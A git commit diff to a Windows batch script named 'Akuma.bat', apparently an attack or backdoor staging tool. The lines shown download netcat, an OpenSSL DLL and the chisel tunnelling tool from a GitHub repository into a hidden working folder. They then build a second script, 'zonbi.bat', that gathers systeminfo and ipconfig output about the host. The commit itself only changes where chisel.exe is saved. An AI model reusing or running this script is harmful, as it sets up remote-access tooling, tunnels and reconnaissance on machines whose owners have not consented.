f007e6959aa51416425cc8eb8e85d7122bb57c50
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-18 22:17:03 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -7,7 +7,7 @@ cd %homedrive%\Akuma
 mkdir %homedrive%\Akuma\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
-curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > chisel.exe
+curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
